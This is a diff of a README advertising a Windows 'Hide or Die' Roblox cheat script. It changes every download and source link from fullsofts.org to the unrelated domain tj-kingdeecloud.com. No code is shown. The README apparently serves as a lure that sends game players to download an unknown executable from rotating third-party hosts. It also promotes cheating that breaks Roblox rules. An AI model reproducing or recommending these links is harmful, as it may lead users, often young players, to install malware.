@@ -1,9 +1,9 @@
 # Hide or Die Roblox Script 2026
 
-[![Download Now](https://img.shields.io/badge/Download-Hide_or_Die_2026-00cc44?style=for-the-badge&logo=roblox&logoColor=white)](https://fullsofts.org/)
-[![Latest Version](https://img.shields.io/badge/Version-2026.1.0-blue?style=flat-square)](https://fullsofts.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=flat-square)](https://fullsofts.org/)
-[![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-Hide_or_Die_2026-00cc44?style=for-the-badge&logo=roblox&logoColor=white)](https://tj-kingdeecloud.com/)
+[![Latest Version](https://img.shields.io/badge/Version-2026.1.0-blue?style=flat-square)](https://tj-kingdeecloud.com/)
+[![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=flat-square)](https://tj-kingdeecloud.com/)
+[![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)](https://tj-kingdeecloud.com/)
 
 ## Overview
 
@@ -35,4 +35,4 @@ The primary executable file does not require a specific naming convention. Simpl
 This software is intended for personal use within permitted boundaries of the Roblox platform. Users are responsible for adhering to Roblox Terms of Service. The developers are not liable for any account restrictions resulting from misuse.
 
 ---
-**Source:** [https://fullsofts.org/](https://fullsofts.org/)
+**Source:** [https://tj-kingdeecloud.com/](https://tj-kingdeecloud.com/)
